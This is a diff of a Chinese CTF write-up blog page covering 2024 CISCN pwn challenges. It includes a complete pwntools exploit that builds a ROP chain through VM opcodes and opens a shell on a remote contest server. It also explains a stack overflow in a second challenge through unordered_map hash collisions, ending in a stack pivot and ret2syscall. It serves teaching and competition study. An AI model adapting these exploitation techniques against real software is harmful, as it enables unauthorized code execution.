write_stack(<span class="number">28</span>,<span class="number">31</span>,<span class="number">0x130</span>)</span><br></pre></td></tr></table></figure></div>
-
 <p>基本动态调试能正确算出一个偏移，那么其它的也就没问题了，这里我往25号模拟寄存器存libc_base，24号模拟寄存器存偏移。直接往返回地址处写rop链。最后也是只用了0x150字节，离0x300字节的上限还远。</p>
 <img  
                      lazyload
@@ -897,13 +870,7 @@
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215201820964.png"
                       class=""
                 >
-
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line"><span class="comment"># 0x300大小限制</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#    len    func</span></span><br><span class="line"><span class="comment"># 1   4      add</span></span><br><span class="line"><span class="comment"># 2   4      sub</span></span><br><span class="line"><span class="comment"># 3   4      mul</span></span><br><span class="line"><span class="comment"># 4   4      div</span></span><br><span class="line"><span class="comment"># 5   4      xor</span></span><br><span class="line"><span class="comment"># 6   4      and</span></span><br><span class="line"><span class="comment"># 7   4      shl</span></span><br><span class="line"><span class="comment"># 8   4      shr</span></span><br><span class="line"><span class="comment"># 9   4     write_stack</span></span><br><span class="line"><span class="comment"># 10  4     write_reg</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">1</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">2</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">3</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">div</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">4</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">5</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">and_</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">6</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shl</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">7</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shr</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">8</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_stack</span>(<span class="params">tarreg,reg1,num</span>):</span><br><span class="line">    payload = p32((<span class="number">9</span>&lt;&lt;<span class="number">0x1c</span>)+(tarreg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((num&amp;<span class="number">0xfff</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_reg</span>(<span class="params">tarreg,reg1,num</span>):</span><br><span class="line">     payload = p32((<span class="number">10</span>&lt;&lt;<span class="number">0x1c</span>)+(tarreg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((num&amp;<span class="number">0xfff</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">     <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_addr</span>(<span class="params">offset,tar</span>):</span><br><span class="line">    binary = <span class="built_in">bin</span>(offset)[<span class="number">2</span>:][::-<span class="number">1</span>]</span><br><span class="line">    payload = add(tar,<span class="number">31</span>,<span class="number">31</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(binary)):</span><br><span class="line">        <span class="keyword">if</span> binary[i]==<span class="string">&quot;1&quot;</span>:</span><br><span class="line">            payload += add(tar,tar,i)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">    </span><br><span class="line"><span class="comment"># p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;47.94.202.237&quot;</span>,<span class="number">36894</span>)</span><br><span class="line"><span class="comment">#-0x29d90</span></span><br><span class="line">payload =  write_reg(<span class="number">25</span>,<span class="number">0</span>,<span class="number">0xd38</span>) + write_reg(<span class="number">0</span>,<span class="number">31</span>,<span class="number">0xd30</span>)+add(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>)+add(<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>)+add(<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>)+add(<span class="number">4</span>,<span class="number">3</span>,<span class="number">3</span>)+add(<span class="number">5</span>,<span class="number">4</span>,<span class="number">4</span>)+add(<span class="number">6</span>,<span class="number">5</span>,<span class="number">5</span>)</span><br><span class="line">payload += add(<span class="number">7</span>,<span class="number">6</span>,<span class="number">6</span>)+add(<span class="number">8</span>,<span class="number">7</span>,<span class="number">7</span>)+add(<span class="number">9</span>,<span class="number">8</span>,<span class="number">8</span>)+add(<span class="number">10</span>,<span class="number">9</span>,<span class="number">9</span>)+add(<span class="number">11</span>,<span class="number">10</span>,<span class="number">10</span>)+add(<span class="number">12</span>,<span class="number">11</span>,<span class="number">11</span>)+add(<span class="number">13</span>,<span class="number">12</span>,<span class="number">12</span>)+add(<span class="number">14</span>,<span class="number">13</span>,<span class="number">13</span>)+add(<span class="number">15</span>,<span class="number">14</span>,<span class="number">14</span>)</span><br><span class="line">payload += add(<span class="number">16</span>,<span class="number">15</span>,<span class="number">15</span>)+add(<span class="number">17</span>,<span class="number">16</span>,<span class="number">16</span>)+add(<span class="number">18</span>,<span class="number">17</span>,<span class="number">17</span>)+add(<span class="number">19</span>,<span class="number">18</span>,<span class="number">18</span>)+add(<span class="number">20</span>,<span class="number">19</span>,<span class="number">19</span>)+add(<span class="number">21</span>,<span class="number">20</span>,<span class="number">20</span>)+add(<span class="number">22</span>,<span class="number">21</span>,<span class="number">21</span>)+add(<span class="number">23</span>,<span class="number">22</span>,<span class="number">22</span>)</span><br><span class="line">payload += make_addr(<span class="number">0x29d90</span>,<span class="number">24</span>)</span><br><span class="line">payload += sub(<span class="number">25</span>,<span class="number">25</span>,<span class="number">24</span>)</span><br><span class="line">payload += make_addr(<span class="number">0x29139</span>,<span class="number">24</span>) + add(<span class="number">29</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">29</span>,<span class="number">31</span>,<span class="number">0x118</span>) </span><br><span class="line">payload += make_addr(<span class="number">0x2a3e5</span>,<span class="number">24</span>) + add(<span class="number">26</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">26</span>,<span class="number">31</span>,<span class="number">0x120</span>) </span><br><span class="line">payload += make_addr(<span class="number">0x1d8678</span>,<span class="number">24</span>) + add(<span class="number">27</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">27</span>,<span class="number">31</span>,<span class="number">0x128</span>)</span><br><span class="line">payload += make_addr(<span class="number">0x50D70</span>,<span class="number">24</span>) + add(<span class="number">28</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">28</span>,<span class="number">31</span>,<span class="number">0x130</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write_reg(15,0,0xd20)  0x1000</span></span><br><span class="line"><span class="comment"># +write_reg(1,0,0x118)+write_reg(2,0,0x100)+write_reg(3,0,0xd38)+sub(4,1,2)+mul(5,4,4)</span></span><br><span class="line"><span class="comment"># payload += mul(5,5,17)*5 + sub(5,5,15)*6</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendafter(<span class="string">&quot;opcode:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
-
-
-
-
-
 <h4 id="pwn-novel1"><a href="#pwn-novel1" class="headerlink" title="pwn-novel1"></a>pwn-novel1</h4><p>C++编译出来的一个二进制文件，直接IDA静态分析有点头大，先运行看看大致功能。</p>
 <p>首先会让我们输入Author的名字，然后有两种选项可供选择。第一个选项会让我们输入Blood和Evidence，其中Blood是一个序号，且不能多次设置同一个Blood位置；Evidence看不出来是干什么的，但是会发现字母是不行的，可以输入数字。根据命名bloodstain（血迹），以及Evidence（线索），我们先猜测是跟着某种线索寻找血迹。</p>
 <img  
@@ -912,14 +879,12 @@
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250104213341948.png"
                       class=""
                 >
-
 <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250104213711557.png"
                       class=""
                 >
-
 <p>用2号功能大概是找相似的血迹，但目前并不清楚具体原理。</p>
 <img  
                      lazyload
@@ -927,9 +892,9 @@
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250104232309225.png"
                       class=""
                 >
-
 <p>之后还是得看静态反汇编出的代码，这里的unordered_map实际上c++的一个模板类，其具体函数的作用其实我们能够查到。常用函数如下。就功能而言，unordered_map类似于python中的字典类型，提供一个键值对的映射。</p>
 <p><strong>1. 构造与初始化</strong></p>
+<div class="table-container">
 <table>
 <thead>
 <tr>
@@ -937,7 +902,8 @@
 <th>描述</th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr>
 <td><code>unordered_map()</code></td>
 <td>默认构造函数，创建一个空的 <code>unordered_map</code> 对象。</td>
 </tr>
@@ -957,9 +923,12 @@
 <td><code>unordered_map(other, std::move)</code></td>
 <td>移动构造函数，转移另一个对象的资源。</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
+</div>
 <hr>
 <p><strong>2. 插入与更新元素</strong></p>
+<div class="table-container">
 <table>
 <thead>
 <tr>
@@ -967,7 +936,8 @@
 <th>描述</th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr>
 <td><code>insert(const pair&lt;Key, T&gt;&amp; val)</code></td>
 <td>插入键值对，如果键已存在，不插入。</td>
 </tr>
@@ -995,9 +965,12 @@
 <td><code>try_emplace(key, args...)</code></td>
 <td>若键不存在则插入新值，若键存在则什么都不做。</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
+</div>
 <hr>
 <p><strong>3. 删除元素</strong></p>
+<div class="table-container">
 <table>
 <thead>
 <tr>
@@ -1005,7 +978,8 @@
 <th>描述</th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr>
 <td><code>erase(key)</code></td>
 <td>删除指定键的元素，返回删除的元素个数（0 或 1）。</td>
 </tr>
@@ -1021,9 +995,12 @@
 <td><code>clear()</code></td>
 <td>清空 <code>unordered_map</code> 中的所有元素。</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
+</div>
 <hr>
 <p><strong>4. 查找元素</strong></p>
+<div class="table-container">
 <table>
 <thead>
 <tr>
@@ -1031,7 +1008,8 @@
 <th>描述</th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr>
 <td><code>find(key)</code></td>
 <td>返回指向键的迭代器，若键不存在，返回 <code>end()</code>。</td>
 </tr>
@@ -1047,9 +1025,12 @@
 <td><code>equal_range(key)</code></td>
 <td>返回表示与指定键关联的元素范围的迭代器对。</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
+</div>
 <hr>
 <p><strong>5. 容量相关</strong></p>
+<div class="table-container">
 <table>
 <thead>
 <tr>
@@ -1057,7 +1038,8 @@
 <th>描述</th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr>
 <td><code>empty()</code></td>
 <td>检查容器是否为空，返回 <code>true</code> 或 <code>false</code>。</td>
 </tr>
@@ -1069,9 +1051,12 @@
 <td><code>max_size()</code></td>
 <td>返回容器支持的最大元素数量。</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
+</div>
 <hr>
 <p><strong>6. 哈希表相关</strong></p>
+<div class="table-container">
 <table>
 <thead>
 <tr>
@@ -1079,7 +1064,8 @@
 <th>描述</th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr>
 <td><code>bucket_count()</code></td>
 <td>返回哈希表中的桶数量。</td>
 </tr>
@@ -1093,7 +1079,7 @@
 </tr>
 <tr>
 <td><code>load_factor()</code></td>
-<td>返回当前的加载因子（元素数量 &#x2F; 桶数量）。</td>
+<td>返回当前的加载因子（元素数量 / 桶数量）。</td>
 </tr>
 <tr>
 <td><code>max_load_factor(factor)</code></td>
@@ -1115,9 +1101,12 @@
 <td><code>key_eq()</code></td>
 <td>返回用于比较键是否相等的函数对象。</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
+</div>
 <hr>
 <p><strong>7. 迭代器相关</strong></p>
+<div class="table-container">
 <table>
 <thead>
 <tr>
@@ -1125,7 +1114,8 @@
 <th>描述</th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr>
 <td><code>begin()</code></td>
 <td>返回指向容器第一个元素的迭代器。</td>
 </tr>
@@ -1149,9 +1139,12 @@
 <td><code>rend()</code></td>
 <td>返回指向容器第一个元素之前的反向迭代器。</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
+</div>
 <hr>
 <p><strong>8. 比较两个 unordered_map</strong></p>
+<div class="table-container">
 <table>
 <thead>
 <tr>
@@ -1159,7 +1152,8 @@
 <th>描述</th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr>
 <td><code>operator==</code></td>
 <td>判断两个 <code>unordered_map</code> 是否相等。</td>
 </tr>
@@ -1167,7 +1161,9 @@
 <td><code>operator!=</code></td>
 <td>判断两个 <code>unordered_map</code> 是否不相等。</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
+</div>
 <p>那么我们先看part1的功能，首先<strong>bloodstains</strong>是一个模板类，其键为unsigned int类型，值为unsigned long类型。然后这个模板类中不能含有超过31个键值对，否则会调用fragment退出。而且后面通过find寻找我们输入的键，如果找到就退出，说明限制了不能有相同的键。最后对result的两次操作会为键值对赋值。</p>
 <img  
                      lazyload
@@ -1175,7 +1171,6 @@
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250105145338871.png"
                       class=""
                 >
-
 <p>之后看part2功能，这里首先是从bloodstains中，寻找我们输入的Blood键是否在其中，如果不在就直接退出。然后我们需要理解一下bucket这个桶的机制。</p>
 <img  
                      lazyload
@@ -1183,12 +1178,11 @@
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250122160017991.png"
                       class=""
                 >
-
 <p><strong>1. 桶的管理机制</strong></p>
 <ol>
 <li><strong>哈希函数与桶的分布</strong>:<ul>
 <li><code>unordered_map</code> 使用 <strong>哈希函数</strong> 对键 (key) 进行散列，计算哈希值。</li>
-<li>通过以下公式确定键值对存储的桶索引： $bucket\ index&#x3D;hash(key) %bucket\ count$</li>
+<li>通过以下公式确定键值对存储的桶索引： $bucket\ index=hash(key) \%bucket\ count$</li>
 <li><code>bucket_count</code> 是当前的桶数量（可以随装载因子（load factor）变化自动调整）。</li>
 </ul>
 </li>
@@ -1198,7 +1192,7 @@
 </ul>
 </li>
 <li><strong>装载因子与桶重分配</strong>:<ul>
-<li>装载因子 (Load Factor)：表示哈希表的密度，公式为：$\text{load factor} &#x3D; \frac{\text{size}}{\text{bucket count}}$</li>
+<li>装载因子 (Load Factor)：表示哈希表的密度，公式为：$\text{load factor} = \frac{\text{size}}{\text{bucket count}}$</li>
 <li>如果装载因子超出预设值，<code>unordered_map</code> 会自动 <strong>增大桶的数量</strong>（通常翻倍），并重新分配键值对以减少冲突。</li>
 </ul>
 </li>
@@ -1226,14 +1220,13 @@
 </ul>
 </li>
 </ol>
-<p>我们动调时发现，在part2功能里的copy函数中，会往栈上写内容。这里比如我们在part1功能中先输入键为3，值为4。然后对比copy执行前后，发现这里往栈上写了键值对&lt;3,4&gt;，其实我们仔细分析copy函数的参数，能发现一个**_Local_iterator**迭代器，这里其实就是把在一个桶中的键值存到栈上。那么只要我们把用part1功能加入hash冲突并在同一个桶里的多个键，就能够往栈上隔8字节写一个可控的值，这里返回地址刚好可以被值覆盖。</p>
+<p>我们动调时发现，在part2功能里的copy函数中，会往栈上写内容。这里比如我们在part1功能中先输入键为3，值为4。然后对比copy执行前后，发现这里往栈上写了键值对<3,4>，其实我们仔细分析copy函数的参数，能发现一个<strong>_Local_iterator</strong>迭代器，这里其实就是把在一个桶中的键值存到栈上。那么只要我们把用part1功能加入hash冲突并在同一个桶里的多个键，就能够往栈上隔8字节写一个可控的值，这里返回地址刚好可以被值覆盖。</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250122231726637.png"
                       class=""
                 >
-
 <p>之后我们的目标就是找到hash冲突的键，这道题其实指定重载了hash函数，是一个模除运算。那么我们可以打断点（<code>b std::__detail::_Mod_range_hashing::operator()</code>）进行调试，这里我们把键设置为4，值设置为3看看。</p>
 <img  
                      lazyload
@@ -1241,7 +1234,6 @@
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250123180738173.png"
                       class=""
                 >
-
 <p>总共会在断点停下两次，第二次到断点时，我们能发现一个0xd的模数。这个数字是固定的。</p>
 <img  
                      lazyload
@@ -1249,14 +1241,12 @@
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124013848801.png"
                       class=""
                 >
-
 <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124174005151.png"
                       class=""
                 >
-
 <p>然后我们发现只要其键是在模13的某个剩余类中，其就会存在一个桶里，而且是通过堆上的一个管理块进行管理的，在一个桶中的元素用一个链表连起来。那么我们就可以通过part2的copy函数实现栈溢出。比如我们键为1和14，值都设置为0x666，那么copy执行后可以看到栈顶就为这两个键值对。经过计算，我们设置21个冲突的键就能覆盖到返回地址处。</p>
 <img  
                      lazyload
@@ -1264,14 +1254,12 @@
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124014128627.png"
                       class=""
                 >
-
 <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124170922342.png"
                       class=""
                 >
-
 <p>但是在调试时，如果直接循环写入21个，会发现最终只会写到栈上一个。经过尝试，最终发现临界点是写入13个，这正好是我们的模数。C++ 中的 <code>std::unordered_map</code> 动态扩展机制类似于 C 的动态数组，会根据负载因子自动扩容（从 13 扩展到 29），新桶数组重新哈希分配，链表通过索引计算（如 <code>i * 29</code>）重新串联。这个29可以通过调试出来。之后会申请一个更大的0xf0大小的管理块，处理完毕后原来0x70大小的管理块会被释放掉。因为我们只用21个就能覆盖到返回地址，所以我们一开始都用模29的进行冲突，那么其扩容后就刚好可以存在一个桶里。</p>
 <img  
                      lazyload
@@ -1279,7 +1267,6 @@
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124174537805.png"
                       class=""
                 >
-
 <p>之后就是构造ROP链，程序里留下了一些gadget。其中有个gadget可以控制rsp。而且一开始的prologue功能中能够往一个author全局变量中读取0x80字节的内容，这个author的地址我们又可以获知。那么我们可以把栈迁移到author处。</p>
 <img  
                      lazyload
@@ -1287,14 +1274,12 @@
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124185257849.png"
                       class=""
                 >
-
 <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124192217525.png"
                       class=""
                 >
-
 <p>之后我们进行rop链构建，这里还有点麻烦的是，我们按顺序调用part1，最后用part2写到栈上时，顺序有所打乱，分界点也就是一开始的模数0xd，这里我把占位的value全换成了调用part1的顺序，可以清楚看到复制到栈上的逻辑。那么我们直接把对应返回地址的位置的内容换为我们的gadget以及author地址即可。</p>
 <img  
                      lazyload
@@ -1302,7 +1287,6 @@
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124192500030.png"
                       class=""
                 >
-
 <p>栈迁移之后就正常retlibc即可。后面要返回主函数再次往author中读入getshell的rop，由于前面把栈迁移到了这里，在调用一些函数时可能会把返回地址覆盖了，导致会出现问题。所以我们第二次写rop时要把fgets的返回地址给还原，call过去时rsp指向author+8，那么返回地址就在author的地址处。之后布局好rop后就能直接靠prologue的ret返回了。注意栈对齐，而且如果直接调用system的话，其申请的栈空间有点多，我们又做过栈迁移，会导致执行时栈到了不可写的段从而失败，这里我们就ret2syscall。</p>
 <img  
                      lazyload
@@ -1310,23 +1294,19 @@
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124210031726.png"
                       class=""
                 >
-
 <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124211116655.png"
                       class=""
                 >
-
 <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124211906895.png"
                       class=""
                 >
-
